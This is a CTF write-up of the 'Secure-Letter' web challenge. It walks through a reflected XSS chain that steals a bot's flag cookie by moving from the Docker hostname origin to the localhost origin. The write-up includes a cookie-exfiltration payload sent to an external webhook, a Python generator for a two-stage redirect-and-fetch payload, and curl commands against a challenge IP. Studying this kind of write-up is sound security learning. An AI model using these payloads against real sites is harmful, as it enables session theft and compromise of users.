# QnQSec CTF 2025 — Secure-Letter
- **Category:** Web
- **Tags:** XSS, Internal Exfiltration, Docker Networking, Same-Origin Policy
- Author: Legasi

---

## **1. Challenge Summary**

The challenge provided a Node.js web application, "Secure-Letter," which allows users to write and view letters. A Puppeteer bot was available to "report" URLs for review. The ultimate goal was to steal the bot's cookie, which contained the flag. The core of the challenge involved exploiting a Reflected Cross-Site Scripting (XSS) vulnerability while navigating complex constraints imposed by Docker networking, browser security policies, and network isolation.

---

## **2. Initial Analysis & Reconnaissance**

Upon reviewing the provided `server.js` and `bot.js` source files, several key mechanics were identified:

- **Web Server (`server.js`):**
    - An endpoint `/letter` takes a `content` query parameter and renders its value directly into the HTML response without any sanitization, indicating a classic Reflected XSS vulnerability.
    - API endpoints exist to create (`/api/letter`) and list (`/api/letters`) letters saved by users.
    - A reporting endpoint (`/api/report`) takes a URL and forwards it to the bot for a visit.
- **Bot (`bot.js`):**
    - The bot uses Puppeteer to visit a submitted URL.
    - Crucially, before visiting, the bot sets a cookie: `name: 'flag', value: FLAG{...}, domain: 'localhost'`. The `HttpOnly` flag is set to `false`, making the cookie accessible via JavaScript.
    - The challenge notes specified that from the bot's perspective, the web server is reachable at the hostname `web:3001`.

This setup immediately presented the central conflict: the XSS payload had to be executed from the `localhost` origin for the cookie to be accessible, but the bot could only initiate connections to the `web` hostname.

---

## **3. The Vulnerability**

The solution required chaining multiple vulnerabilities and environmental constraints:

1. **Reflected XSS:** The primary entry point was the lack of output encoding on the `content` parameter in the `/letter` route. Any HTML/JavaScript passed in this parameter would be executed by the visitor's browser.
2. **Same-Origin Policy Bypass:** The main challenge was bypassing the browser's Same-Origin Policy. A direct XSS payload served from `http://web:3001` could not read a cookie set for `http://localhost`.
3. **Network Isolation:** Through trial and error, it was discovered that the bot's container had no outbound internet access. It could not make requests to external domains like `webhook.site`. This made traditional data exfiltration impossible. The flag had to be "exfiltrated" internally, back into the application itself.

The final exploit path required a two-stage XSS attack to change the browser's origin, followed by an internal data exfiltration using the application's own API.

## **4. Exploitation Steps**

The exploitation process was iterative, with each failed attempt revealing a new constraint of the challenge environment.

1. **Initial Failure: Direct Exfiltration**
The first attempt involved a standard XSS payload to send the bot's cookie to an external webhook.
    - **Payload Sent to Bot:** `http://[IP]:3001/letter?content=<script>document.location='[WEBHOOK]?c='+document.cookie</script>`
    - **Result:** The webhook received a request, but the cookie value was empty.
    - **Conclusion:** This revealed the **origin mismatch**. The bot visited the server via its IP address, but the cookie was scoped to the `localhost` domain, so the browser correctly refused to attach it.
2. **Second Failure: `localhost` Exfiltration**
The next logical step was to make the bot access the page via `localhost` so the cookie would be valid.
    - **Payload Sent to Bot:** `http://localhost:3001/letter?content=<script>...[payload]...</script>`
    - **Result:** The bot failed to visit the URL entirely.
    - **Conclusion:** This revealed the **Docker networking constraint**. The bot, running in its own container, could not resolve `localhost` to the web server's container. It had to use the internal Docker hostname `web`.
3. **Third Failure: External Redirect & Network Isolation**
The final attempt to exfiltrate externally involved a two-stage attack to solve the origin problem.
    - **Payload Sent to Bot:** `http://web:3001/letter?content=<script>window.location='http://localhost:3001/letter?content=...'</script>`
    - **Result:** The bot reported a successful visit, but the external webhook never received a request.
    - **Conclusion:** This was the final key discovery: the bot container was **network-isolated** and could not make requests to the public internet.
4. **Success: Two-Stage XSS with Internal Exfiltration**
Since the data could not be sent out, it had to be exfiltrated *in*. The final plan was to force the bot to save its own cookie as a new letter in the application, which we could then read.
    - **Stage 1 (Origin Hop):** A payload was crafted and sent to `http://web:3001`. This payload's only job was to force the bot's browser to redirect to the Stage 2 payload at `http://localhost:3001`.
    - **Stage 2 (Internal Exfiltration):** Now running on the `localhost` origin, the second XSS payload executed. It used the `fetch` API to make a `POST` request to the web application's own `/api/letter` endpoint. The body of this request contained the bot's `document.cookie`.
    - **Stage 3 (Flag Retrieval):** After the bot visit, a simple `GET` request was made to the `/api/letters` endpoint, which listed all saved letters. One of these letters now contained the flag.

---

## **5. Final Exploit / Payload**

The final attack can be executed with a single `curl` command that constructs and sends the multi-layered payload.

```python
# --- Python script to generate the final URL ---
import urllib.parse

# Stage 2: The payload that runs on localhost. It reads the cookie
# and POSTs it back to the application's API as a new letter.
internal_payload = """
<script>
  fetch('/api/letter', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({content: document.cookie})
  });
</script>
"""

# URL-encode the Stage 2 payload
encoded_internal_payload = urllib.parse.quote(internal_payload)

# Stage 1: The payload that runs on 'web:3001'. It redirects the bot's browser
# to localhost, carrying the Stage 2 payload in the query string.
redirector_payload = f"<script>window.location='http://localhost:3001/letter?content={encoded_internal_payload}'</script>"

# URL-encode the Stage 1 payload
encoded_redirector_payload = urllib.parse.quote(redirector_payload)

# The final URL that the bot needs to visit
bot_url = f"http://web:3001/letter?content={encoded_redirector_payload}"

print("Final URL for the bot:")
print(bot_url)
```

**Execution Commands:**

1. **Send the payload to the bot:**Bash

```bash
# (Replace BOT_URL with the output from the Python script above)
curl 'http://161.97.155.116:3001/api/report' \
  -H 'Content-Type: application/json' \
  --data-raw '{"url":"[BOT_URL]"}'
```

1. **Retrieve the flag:** After a few seconds, make a request to the API to list all letters.

```bash
curl 'http://161.97.155.116:3001/api/letters'
```

The response will be a JSON array containing a letter with the flag.

---

## **6. Key Takeaways & Lessons Learned**

- **Docker Networking vs. Browser Security:** This challenge was a masterclass in the conflict between backend container networking (`web` hostname) and frontend browser security (Same-Origin Policy for `localhost` cookies). The solution required using an exploit (XSS) to bridge this gap.
- **Internal Exfiltration:** When external C2 (Command and Control) channels are blocked due to network isolation, an application's own features can often be abused to store or echo back sensitive data.
- **Trust the Hints:** The challenge note "use web:3001 for bot" was not just a suggestion but a critical piece of the puzzle, confirming the Docker networking setup and forcing the attacker away from simplistic `localhost` payloads.
